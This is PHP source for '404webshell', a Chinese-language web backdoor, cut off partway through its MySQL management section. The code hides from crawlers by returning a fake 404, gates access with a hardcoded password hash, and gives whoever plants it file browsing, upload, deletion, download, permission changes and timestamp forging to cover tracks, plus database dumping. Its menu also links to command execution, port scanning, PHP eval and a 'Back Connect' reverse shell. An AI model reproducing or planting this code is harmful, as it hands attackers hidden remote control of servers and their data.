<?php
/**
 * Short description for 404webshell.php
 *
 * @package 404webshell
 * @author xl7dev <xl7dev@xl7dev.local>
 * @version 0.1
 * @copyright (C) 2015 xl7dev <xl7dev@xl7dev.local>
 * @license MIT
 */

//ini_set('display_errors',1);

@error_reporting(7);

@session_start();

@set_time_limit(0);

@set_magic_quotes_runtime(0);

if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {

    header('HTTP/1.0 404 Not Found');

    exit;

}

ob_start();

$mtime = explode(' ', microtime());

$starttime = $mtime[1] + $mtime[0];

define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');

define('SELF', $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);

define('IS_WIN', DIRECTORY_SEPARATOR == '\\');

define('IS_GPC', get_magic_quotes_gpc());

$dis_func = get_cfg_var('disable_functions');

define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );



if( IS_GPC ) { 

    $_POST = s_array($_POST);

}

$P = $_POST;

unset($_POST);

/*===================== 程序配置 =====================*/




$pass  = 'e10adc3949ba59abbe56e057f20f883e'; //对应的密码是 123456



//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认

// cookie 前缀

$cookiepre = '';

// cookie 作用域

$cookiedomain = '';

// cookie 作用路径

$cookiepath = '/';

// cookie 有效期

$cookielife = 86400;



/*===================== 配置结束 =====================*/



$charsetdb = array(

    'big5'          =&gt; 'big5',

    'cp-866'        =&gt; 'cp866',

    'euc-jp'        =&gt; 'ujis',

    'euc-kr'        =&gt; 'euckr',

    'gbk'           =&gt; 'gbk',

    'iso-8859-1'    =&gt; 'latin1',

    'koi8-r'        =&gt; 'koi8r',

    'koi8-u'        =&gt; 'koi8u',

    'utf-8'         =&gt; 'utf8',

    'windows-1252'  =&gt; 'latin1',

);



$act = isset($P['act']) ? $P['act'] : '';

$charset = isset($P['charset']) ? $P['charset'] : 'gbk';

$doing = isset($P['doing']) ? $P['doing'] : '';



for ($i=1;$i&lt;=4;$i++) {

    ${'p'.$i} = isset($P['p'.$i]) ? $P['p'.$i] : '';

}



if (isset($charsetdb[$charset])) {

    header("content-Type: text/html; charset=".$charset);

}



$timestamp = time();



/* 身份验证 */

if ($act == "Logout") {

    scookie('loginpass', '', -86400 * 365);

    @header('Location: '.SELF);

    exit;

}

if($pass) {

    if ($act == 'login') {

        if ($pass == encode_pass($P['password'])) {

            scookie('loginpass',encode_pass($P['password']));

            @header('Location: '.SELF);

            exit;

        }

    }

    if (isset($_COOKIE['loginpass'])) {

        if ($_COOKIE['loginpass'] != $pass) {

            loginpage();

        }

    } else {

        loginpage();

    }

}

/* 验证结束 */



$errmsg = '';

$uchar = '▲';

$dchar = '▼';

!$act &amp;&amp; $act = 'file';



//当前目录/设置工作目录/网站根目录

$home_cwd = getcwd();

if (isset($P['cwd']) &amp;&amp; $P['cwd']) {

    chdir($P['cwd']);

} else {

    chdir(SA_ROOT);

}

$cwd = getcwd();

$web_cwd = $_SERVER['DOCUMENT_ROOT'];

foreach (array('web_cwd','cwd','home_cwd') as $k) {

    if (IS_WIN) {

        $$k = str_replace('\\', '/', $$k);

    }

    if (substr($$k, -1) != '/') {

        $$k = $$k.'/';

    }

}



// 查看PHPINFO

if ($act == 'phpinfo') {

    if (IS_PHPINFO) {

        phpinfo();

        exit;

    } else {

        $errmsg = 'phpinfo() function has disabled';

    }

}



if(!function_exists('scandir')) {

    function scandir($cwd) {

        $files = array();

        $dh = opendir($cwd);

        while ($file = readdir($dh)) {

            $files[] = $file;

        }

        return $files ? $files : 0;

    }

}



if ($act == 'down') {

    if (is_file($p1) &amp;&amp; is_readable($p1)) {

        @ob_end_clean();

        $fileinfo = pathinfo($p1);

        if (function_exists('mime_content_type')) {

            $type = @mime_content_type($p1);

            header("Content-Type: ".$type);

        } else {

            header('Content-type: application/x-'.$fileinfo['extension']);

        }

        header('Content-Disposition: attachment; filename='.$fileinfo['basename']);

        header('Content-Length: '.sprintf("%u", @filesize($p1)));

        @readfile($p1);

        exit;

    } else {

        $errmsg = 'Can\'t read file';

        $act = 'file';

    }

}

?&gt;

&lt;html&gt;

&lt;head&gt;

&lt;meta http-equiv="Content-Type" content="text/html; charset=&lt;?php echo $charset;?&gt;"&gt;

&lt;title&gt;&lt;?php echo $act.' - '.$_SERVER['HTTP_HOST'];?&gt;&lt;/title&gt;

&lt;style type="text/css"&gt;

body,td{font: 12px Arial,Tahoma;line-height: 16px;}

.input, select{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}

.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}

.red{color:#f00;}

.black{color:#000;}

.green{color:#090;}

.b{font-weight:bold;}

.bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;font:12px Arial,Tahoma;height:22px;}

a {color: #00f;text-decoration:none;}

a:hover{color: #f00;text-decoration:underline;}

.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}

.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}

.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffa;padding:5px 15px 5px 5px;}

.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}

.head td span{font-weight:normal;}

.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}

form{margin:0;padding:0;}

h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}

ul.info li{margin:0;color:#444;line-height:24px;height:24px;}

u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}

.drives{padding:5px;}

.drives span {margin:auto 7px;}

&lt;/style&gt;

&lt;script type="text/javascript"&gt;

function checkall(form) {

    for(var i=0;i&lt;form.elements.length;i++) {

        var e = form.elements[i];

        if (e.type == 'checkbox') {

            if (e.name != 'chkall' &amp;&amp; e.name != 'saveasfile')

                e.checked = form.chkall.checked;

        }

    }

}

function $(id) {

    return document.getElementById(id);

}

function createdir(){

    var newdirname;

    newdirname = prompt('请输入目录名:', '');

    if (!newdirname) return;

    g(null,null,'createdir',newdirname);

}

function fileperm(pfile, val){

    var newperm;

    newperm = prompt('当前 目录/文件:'+pfile+'\n请输入新的权限:', val);

    if (!newperm) return;

    g(null,null,'fileperm',pfile,newperm);

}

function rename(oldname){

    var newfilename;

    newfilename = prompt('文件名:'+oldname+'\n请输入新的文件名:', '');

    if (!newfilename) return;

    g(null,null,'rename',newfilename,oldname);

}

function createfile(){

    var filename;

    filename = prompt('请输入文件的名字:', '');

    if (!filename) return;

    g('editfile', null, null, filename);

}

function setdb(dbname) {

    if(!dbname) return;

    $('dbform').tablename.value='';

    $('dbform').doing.value='';

    if ($('dbform').sql_query)

    {

        $('dbform').sql_query.value='';

    }

    $('dbform').submit();

}

function setsort(k) {

    $('dbform').order.value=k;

    $('dbform').submit();

}

function settable(tablename,doing) {

    if(!tablename) return;

    if (doing) {

        $('dbform').doing.value=doing;

    } else {

        $('dbform').doing.value='';

    }

    $('dbform').sql_query.value='';

    $('dbform').tablename.value=tablename;

    $('dbform').submit();

}

function s(act,cwd,p1,p2,p3,p4,charset) {

    if(act != null) $('opform').act.value=act;

    if(cwd != null) $('opform').cwd.value=cwd;

    if(p1 != null) $('opform').p1.value=p1;

    if(p2 != null) $('opform').p2.value=p2;

    if(p3 != null) $('opform').p3.value=p3;

    if(p4 != null) {$('opform').p4.value=p4;}else{$('opform').p4.value='';}

    if(charset != null) $('opform').charset.value=charset;

}

function g(act,cwd,p1,p2,p3,p4,charset) {

    s(act,cwd,p1,p2,p3,p4,charset);

    $('opform').submit();

}

&lt;/script&gt;

&lt;/head&gt;

&lt;body style="margin:0;table-layout:fixed; word-break:break-all"&gt;

&lt;?php



formhead(array('name'=&gt;'opform'));

makehide('act', $act);

makehide('cwd', $cwd);

makehide('p1', $p1);

makehide('p2', $p2);

makehide('p3', $p3);

makehide('p4', $p4);

makehide('charset', $charset);

formfoot();



if(!function_exists('posix_getegid')) {

    $user = @get_current_user();

    $uid = @getmyuid();

    $gid = @getmygid();

    $group = "?";

} else {

    $uid = @posix_getpwuid(@posix_geteuid());

    $gid = @posix_getgrgid(@posix_getegid());

    $uid = $uid['uid'];

    $user = $uid['name'];

    $gid = $gid['gid'];

    $group = $gid['name'];

}

?&gt;

&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;

    &lt;tr class="head"&gt;

        &lt;td&gt;&lt;span style="float:right;"&gt;&lt;?php echo @php_uname();?&gt; / User:&lt;?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?&gt;&lt;/span&gt;&lt;?php echo $_SERVER['HTTP_HOST'];?&gt; (&lt;?php echo gethostbyname($_SERVER['SERVER_NAME']);?&gt;)&lt;/td&gt;

    &lt;/tr&gt;

    &lt;tr class="alt1"&gt;

        &lt;td&gt;

            &lt;span style="float:right;"&gt;编码:

            &lt;?php

            makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'onchange'=&gt;'g(null,null,null,null,null,null,this.value);'));

            ?&gt;

            &lt;/span&gt;

            &lt;a href="javascript:g('logout');"&gt;注销&lt;/a&gt; | 

            &lt;a href="javascript:g('file',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;文件管理器&lt;/a&gt; | 

            &lt;a href="javascript:g('mysqladmin',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;MYSQL管理&lt;/a&gt; | 

            &lt;a href="javascript:g('shell',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;执行命令&lt;/a&gt; | 

            &lt;a href="javascript:g('phpenv',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;PHP变量&lt;/a&gt; | 

            &lt;a href="javascript:g('portscan',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;端口扫描&lt;/a&gt; | 

            &lt;a href="javascript:g('secinfo',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;安全信息&lt;/a&gt; | 

            &lt;a href="javascript:g('eval',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;Eval PHP代码&lt;/a&gt;

            &lt;?php if (!IS_WIN) {?&gt; | &lt;a href="javascript:g('backconnect',null,'','','','','&lt;?php echo $charset;?&gt;');"&gt;Back Connect&lt;/a&gt;&lt;?php }?&gt;

        &lt;/td&gt;

    &lt;/tr&gt;

&lt;/table&gt;

&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;

&lt;?php

$errmsg &amp;&amp; m($errmsg);



if ($act == 'file') {



    // 判断当前目录可写情况

    $dir_writeable = @is_writable($cwd) ? 'Writable' : 'Non-writable';

    if (isset($p1)) {

        switch($p1) {

            case 'createdir':

                // 创建目录

                if ($p2) {

                    m('Directory created '.(@mkdir($cwd.$p2,0777) ? 'success' : 'failed'));

                }

                break;

            case 'uploadFile':

                // 上传文件

                m('File upload '.(@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));

                break;

            case 'fileperm':

                // 编辑文件属性

                if ($p2 &amp;&amp; $p3) {

                    $p3 = base_convert($p3, 8, 10);

                    m('Set file permissions '.(@chmod($p2, $p3) ? 'success' : 'failed'));

                }

                break;

            case 'rename':

                // 改名

                if ($p2 &amp;&amp; $p3) {

                    m($p3.' renamed '.$p2.(@rename($p3, $p2) ? ' success' : ' failed'));

                }

                break;

            case 'clonetime':

                // 克隆时间

                if ($p2 &amp;&amp; $p3) {

                    $time = @filemtime($p3);

                    m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));

                }

                break;

            case 'settime':

                // 自定义时间

                if ($p2 &amp;&amp; $p3) {

                    $time = strtotime($p3);

                    m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));

                }

                break;

            case 'delete':

                // 批量删除文件

                if ($P['dl']) {

                    $succ = $fail = 0;

                    foreach ($P['dl'] as $f) {

                        if (is_dir($cwd.$f)) {

                            if (@deltree($cwd.$f)) {

                                $succ++;

                            } else {

                                $fail++;

                            }

                        } else {

                            if (@unlink($cwd.$f)) {

                                $succ++;

                            } else {

                                $fail++;

                            }

                        }

                    }

                    m('Deleted folder/file(s) have finished, choose '.count($P['dl']).', success '.$succ.', fail '.$fail);

                } else {

                    m('Please select folder/file(s)');

                }

                break;

            case 'paste':

                if($_SESSION['do'] == 'copy') {

                    foreach($_SESSION['dl'] as $f) {

                        copy_paste($_SESSION['c'],$f, $cwd);                    

                    }

                } elseif($_SESSION['do'] == 'move') {

                    foreach($_SESSION['dl'] as $f) {

                        @rename($_SESSION['c'].$f, $cwd.$f);

                    }

                }

                unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);

                break;

            default:

                if($p1 == 'copy' || $p1 == 'move') {

                    if (isset($P['dl']) &amp;&amp; count($P['dl'])) {

                        $_SESSION['do'] = $p1;

                        $_SESSION['dl'] = $P['dl'];

                        $_SESSION['c'] = $P['cwd'];

                        m('Have been copied to the session');

                    } else {

                        m('Please select folder/file(s)');

                    }

                }

                break;

        }

        echo "&lt;script type=\"text/javascript\"&gt;$('opform').p1.value='';$('opform').p2.value='';&lt;/script&gt;";

    }

    //操作完毕

    $free = @disk_free_space($cwd);

    !$free &amp;&amp; $free = 0;

    $all = @disk_total_space($cwd);

    !$all &amp;&amp; $all = 0;

    $used = $all-$free;

    p('&lt;h2&gt;文件管理器——当前的磁盘空间 '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)&lt;/h2&gt;');



    $cwd_links = '';

    $path = explode('/', $cwd);

    $n=count($path);

    for($i=0;$i&lt;$n-1;$i++) {

        $cwd_links .= '&lt;a href="javascript:g(\'file\', \'';

        for($j=0;$j&lt;=$i;$j++) {

            $cwd_links .= $path[$j].'/';

        }

        $cwd_links .= '\');"&gt;'.$path[$i].'/&lt;/a&gt;';

    }



?&gt;

&lt;script type="text/javascript"&gt;

document.onclick = shownav;

function shownav(e){

    var src = e?e.target:event.srcElement;

    do{

        if(src.id =="jumpto") {

            $('inputnav').style.display = "";

            $('pathnav').style.display = "none";

            return;

        }

        if(src.id =="inputnav") {

            return;

        }

        src = src.parentNode;

    }while(src.parentNode)



    $('inputnav').style.display = "none";

    $('pathnav').style.display = "";

}

&lt;/script&gt;

&lt;div style="background:#eee;margin-bottom:10px;"&gt;

    &lt;form onsubmit="g('file',this.cwd.value);return false;" method="POST" id="godir" name="godir"&gt;

        &lt;table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0"&gt;

            &lt;tr&gt;

                &lt;td width="100%"&gt;&lt;?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?&gt; (&lt;?php echo $dir_writeable;?&gt;)&lt;/td&gt;

                &lt;td nowrap&gt;&lt;input class="bt" id="jumpto" name="jumpto" value="进入" type="button"&gt;&lt;/td&gt;

            &lt;/tr&gt;

        &lt;/table&gt;

        &lt;table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;"&gt;

            &lt;tr&gt;

                &lt;td nowrap&gt;当前目录 (&lt;?php echo $dir_writeable;?&gt;, &lt;?php echo getChmod($cwd);?&gt;)&lt;/td&gt;

                &lt;td width="100%"&gt;&lt;input class="input" name="cwd" value="&lt;?php echo $cwd;?&gt;" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;

                &lt;td nowrap&gt;&lt;input class="bt" value="GO" type="submit"&gt;&lt;/td&gt;

            &lt;/tr&gt;

        &lt;/table&gt;

    &lt;/form&gt;

&lt;?php

    if (IS_WIN) {

        $comma = '';

        p('&lt;div class="drives"&gt;');

        foreach( range('A','Z') as $drive ) {

            if (is_dir($drive.':/')) {

                p($comma.'&lt;a href="javascript:g(\'file\', \''.$drive.':/\');"&gt;'.$drive.':\&lt;/a&gt;');

                $comma = '&lt;span&gt;|&lt;/span&gt;';

            }

        }

        p('&lt;/div&gt;');

    }

?&gt;

&lt;/div&gt;

&lt;?php

    p('&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;');

    p('&lt;tr class="alt1"&gt;&lt;td colspan="6" style="padding:5px;line-height:20px;"&gt;');

    p('&lt;form action="'.SELF.'" method="POST" enctype="multipart/form-data"&gt;&lt;div style="float:right;"&gt;&lt;input name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" value="上传" type="submit" /&gt;&lt;input name="charset" value="'.$charset.'" type="hidden" /&gt;&lt;input type="hidden" name="p1" value="uploadFile"&gt;&lt;input name="cwd" value="'.$cwd.'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;');

    p('&lt;a href="javascript:g(\'file\', \''.str_replace('\\','/',$web_cwd).'\');"&gt;根目录&lt;/a&gt;');

    p(' | &lt;a href="javascript:g(\'file\', \''.$home_cwd.'\');"&gt;程序目录&lt;/a&gt;');

    p(' | &lt;a href="javascript:g(\'file\',\''.$cwd.'\',null,null,null,\'dir\');"&gt;可写目录&lt;/a&gt; ');

    p(' | &lt;a href="javascript:createdir();"&gt;新建目录&lt;/a&gt; | &lt;a href="javascript:createfile();"&gt;新建文件&lt;/a&gt;');

    p('&lt;/td&gt;&lt;/tr&gt;');



    $sort = array('filename', 1);

    if($p1) {

        if(preg_match('!s_([A-z_]+)_(\d{1})!', $p1, $match)) {

            $sort = array($match[1], (int)$match[2]);

        }

    }



    formhead(array('name'=&gt;'flist'));

    makehide('act','file');

    makehide('p1','');

    makehide('cwd',$cwd);

    makehide('charset',$charset);

    p('&lt;tr class="head"&gt;');

    p('&lt;td width="2%" nowrap&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /&gt;&lt;/td&gt;');

    p('&lt;td&gt;&lt;a href="javascript:g(\'file\',null,\'s_filename_'.($sort[1]?0:1).'\');"&gt;文件名&lt;/a&gt; '.($p1 == 's_filename_0' ? $dchar : '').($p1 == 's_filename_1' || !$p1 ? $uchar : '').'&lt;/td&gt;');

    p('&lt;td width="16%"&gt;&lt;a href="javascript:g(\'file\',null,\'s_mtime_'.($sort[1]?0:1).'\');"&gt;修改时间&lt;/a&gt; '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'&lt;/td&gt;');

    p('&lt;td width="10%"&gt;&lt;a href="javascript:g(\'file\',null,\'s_size_'.($sort[1]?0:1).'\');"&gt;大小&lt;/a&gt; '.($p1 == 's_size_0' ? $dchar : '').($p1 == 's_size_1' ? $uchar : '').'&lt;/td&gt;');

    p('&lt;td width="20%"&gt;权限 / 修改&lt;/td&gt;');

    p('&lt;td width="22%"&gt;操作&lt;/td&gt;');

    p('&lt;/tr&gt;');



    //查看所有可写文件和目录

    $dirdata=$filedata=array();



    if ($p4 == 'dir') {

        $dirdata = GetWDirList($cwd);

        $filedata = array();

    } else {

        // 默认目录列表

        $dirs = @scandir($cwd);

        if ($dirs) {

            $dirs = array_diff($dirs, array('.'));

            foreach ($dirs as $file) {

                $filepath=$cwd.$file;

                if(@is_dir($filepath)){

                    $dirdb['filename']=$file;

                    $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));

                    $dirdb['chmod']=getChmod($filepath);

                    $dirdb['perm']=PermsColor($filepath);

                    $dirdb['owner']=getUser($filepath);

                    $dirdb['link']=$filepath;

                    if ($file=='..') {

                        $dirdata['up']=1;

                    } else {

                        $dirdata[]=$dirdb;

                    }

                } else {

                    $filedb['filename']=$file;

                    //$filedb['size']=@filesize($filepath);

                    $filedb['size']=sprintf("%u", @filesize($filepath));

                    $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));

                    $filedb['chmod']=getChmod($filepath);

                    $filedb['perm']=PermsColor($filepath);

                    $filedb['owner']=getUser($filepath);

                    $filedb['link']=$filepath;

                    $filedata[]=$filedb;

                }

            }

            unset($dirdb);

            unset($filedb);

        }

    }

    $dir_i = '0';

    if (isset($dirdata['up'])) {

        $thisbg = bg();

        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');

        p('&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="javascript:g(\'file\',\''.getUpPath($cwd).'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;');

        p('&lt;/tr&gt;');

    }

    unset($dirdata['up']);

    usort($dirdata, 'cmp');

    usort($filedata, 'cmp');

    foreach($dirdata as $key =&gt; $dirdb){

        if($p1 == 'getsize' &amp;&amp; $p2 == $dirdb['filename']) {

            $attachsize = dirsize($p2);

            $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';

        } else {

            $attachsize = '&lt;a href="javascript:g(\'file\', null, \'getsize\', \''.$dirdb['filename'].'\');"&gt;查看大小&lt;/a&gt;';

        }

        $thisbg = bg();

        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');

        p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$dirdb['filename'].'"&gt;&lt;/td&gt;');

        p('&lt;td&gt;&lt;a href="javascript:g(\'file\',\''.$dirdb['link'].'\')"&gt;'.$dirdb['filename'].'&lt;/a&gt;&lt;/td&gt;');

        p('&lt;td nowrap&gt;&lt;a href="javascript:g(\'newtime\',null,\''.$dirdb['filename'].'\');"&gt;'.$dirdb['mtime'].'&lt;/a&gt;&lt;/td&gt;');

        p('&lt;td nowrap&gt;'.$attachsize.'&lt;/td&gt;');

        p('&lt;td nowrap&gt;');

        p('&lt;a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');"&gt;'.$dirdb['chmod'].'&lt;/a&gt; / ');

        p('&lt;a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');"&gt;'.$dirdb['perm'].'&lt;/a&gt;'.$dirdb['owner'].'&lt;/td&gt;');

        p('&lt;td nowrap&gt;&lt;a href="javascript:rename(\''.$dirdb['filename'].'\');"&gt;重命名&lt;/a&gt;&lt;/td&gt;');

        p('&lt;/tr&gt;');

        $dir_i++;

    }



    p('&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;');

    $file_i = '0';



    foreach($filedata as $key =&gt; $filedb){

        $fileurl = '/'.str_replace($web_cwd,'',$filedb['link']);

        $thisbg = bg();

        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');

        p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$filedb['filename'].'"&gt;&lt;/td&gt;');

        p('&lt;td&gt;'.((strpos($filedb['link'], $web_cwd) !== false) ? '&lt;a href="'.$fileurl.'" target="_blank"&gt;'.$filedb['filename'].'&lt;/a&gt;' : $filedb['filename']).'&lt;/td&gt;');

        p('&lt;td nowrap&gt;&lt;a href="javascript:g(\'newtime\',null,\''.$filedb['filename'].'\');"&gt;'.$filedb['mtime'].'&lt;/a&gt;&lt;/td&gt;');

        p('&lt;td nowrap&gt;'.sizecount($filedb['size']).'&lt;/td&gt;');

        p('&lt;td nowrap&gt;');

        p('&lt;a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');"&gt;'.$filedb['chmod'].'&lt;/a&gt; / ');

        p('&lt;a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');"&gt;'.$filedb['perm'].'&lt;/a&gt;'.$filedb['owner'].'&lt;/td&gt;');

        p('&lt;td nowrap&gt;');

        p('&lt;a href="javascript:g(\'down\',null,\''.$filedb['filename'].'\');"&gt;下载&lt;/a&gt; | ');

        p('&lt;a href="javascript:g(\'editfile\',null,null,\''.$filedb['filename'].'\');"&gt;编辑&lt;/a&gt; | ');

        p('&lt;a href="javascript:rename(\''.$filedb['filename'].'\');"&gt;重命名&lt;/a&gt;');

        p('&lt;/td&gt;&lt;/tr&gt;');

        $file_i++;

    }

    p('&lt;tr class="'.bg().' head"&gt;&lt;td colspan="5"&gt;&lt;a href="#" onclick="$(\'flist\').p1.value=\'delete\';$(\'flist\').submit();"&gt;删除&lt;/a&gt; | &lt;a href="#" onclick="$(\'flist\').p1.value=\'copy\';$(\'flist\').submit();"&gt;复制&lt;/a&gt; | &lt;a href="#" onclick="$(\'flist\').p1.value=\'move\';$(\'flist\').submit();"&gt;移动&lt;/a&gt;'.(isset($_SESSION['do']) &amp;&amp; @count($_SESSION['dl']) ? ' | &lt;a href="#" onclick="$(\'flist\').p1.value=\'paste\';$(\'flist\').submit();"&gt;Paste&lt;/a&gt;' : '').'&lt;/td&gt;&lt;td align="right"&gt;'.$dir_i.' 目录 / '.$file_i.' 文件&lt;/td&gt;&lt;/tr&gt;');

    p('&lt;/form&gt;&lt;/table&gt;');

}// end dir



elseif ($act == 'mysqladmin') {

    $order = isset($P['order']) ? $P['order'] : '';

    $dbhost = isset($P['dbhost']) ? $P['dbhost'] : '';

    $dbuser = isset($P['dbuser']) ? $P['dbuser'] : '';

    $dbpass = isset($P['dbpass']) ? $P['dbpass'] : '';

    $dbname = isset($P['dbname']) ? $P['dbname'] : '';

    $tablename = isset($P['tablename']) ? $P['tablename'] : '';



    if ($doing == 'dump') {

        if (isset($P['bak_table']) &amp;&amp; $P['bak_table']) {

            $DB = new DB_MySQL;

            $DB-&gt;charsetdb = $charsetdb;

            $DB-&gt;charset = $charset;

            $DB-&gt;connect($dbhost, $dbuser, $dbpass, $dbname);

            if ($P['saveasfile'] &amp;&amp; $P['bak_path']) {

                $fp = @fopen($P['bak_path'],'w');

                if ($fp) {

                    foreach($P['bak_table'] as $k =&gt; $v) {

                        if ($v) {

                            $DB-&gt;sqldump($v, $fp);

                        }

                    }

                    fclose($fp);                

                    $fileurl = str_replace(SA_ROOT,'',$P['bak_path']);

                    m('Database has backup to &lt;a href="'.$fileurl.'" target="_blank"&gt;'.$P['bak_path'].'&lt;/a&gt;');

                } else {

                    m('Backup failed');

                }

            } else {

                @ob_end_clean();

                $filename = basename($dbname.'.sql');

                header('Content-type: application/unknown');

                header('Content-Disposition: attachment; filename='.$filename);

                foreach($P['bak_table'] as $k =&gt; $v) {

                    if ($v) {

                        $DB-&gt;sqldump($v);

                    }

                }

                exit;

            }

            $DB-&gt;close();

        } else {

            m('Please choose the table');

        }

        $doing = '';

    }



    formhead(array('title'=&gt;'MYSQL 管理', 'name'=&gt;'dbform'));

    makehide('act','mysqladmin');

    makehide('doing',$doing);

    makehide('charset', $charset);

    makehide('tablename', $tablename);

    makehide('order', $order);

    p('&lt;p&gt;');

    p('地址:');

    makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));

    p('用户:');

    makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));

    p('密码:');

    makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));

    makeinput(array('value'=&gt;'连接','type'=&gt;'submit','class'=&gt;'bt'));

    p('&lt;/p&gt;');



    if ($dbhost &amp;&amp; $dbuser &amp;&amp; isset($dbpass)) {

        

        // 初始化数据库类

        $DB = new DB_MySQL;

        $DB-&gt;charsetdb = $charsetdb;

        $DB-&gt;charset = $charset;

        $DB-&gt;connect($dbhost, $dbuser, $dbpass, $dbname);



        //获取数据库信息

        p('&lt;p class="red"&gt;MySQL '.$DB-&gt;version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'&lt;/p&gt;');

        $highver = $DB-&gt;version() &gt; '4.1' ? 1 : 0;



        //获取数据库

        $query = $DB-&gt;query("SHOW DATABASES");

        $dbs = array();

        $dbs[] = '-- Select a database --';

        while($db = $DB-&gt;fetch($query)) {

            $dbs[$db['Database']] = $db['Database'];

        }

        makeselect(array('name'=&gt;'dbname','option'=&gt;$dbs,'selected'=&gt;$dbname,'onchange'=&gt;'setdb(this.options[this.selectedIndex].value)'));



        if ($dbname) {

            p('&lt;p&gt;Current dababase: &lt;a href="javascript:setdb(\''.$dbname.'\');"&gt;'.$dbname.'&lt;/a&gt;');

            if ($tablename) {

                p(' | Current Table: &lt;a href="javascript:settable(\''.$tablename.'\');"&gt;'.$tablename.'&lt;/a&gt; [ &lt;a href="javascript:settable(\''.$tablename.'\', \'structure\');"&gt;Structure&lt;/a&gt; ]');

            }

            p('&lt;/p&gt;');



            $sql_query = isset($P['sql_query']) ? $P['sql_query'] : '';



            if ($tablename &amp;&amp; !$sql_query) {

                $sql_query = "SELECT * FROM $tablename LIMIT 0, 30";

            }

            if ($tablename &amp;&amp; $doing == 'structure') {

                $sql_query = "SHOW FULL COLUMNS FROM $tablename;\n";

                $sql_query .= "SHOW INDEX FROM $tablename;";

            }

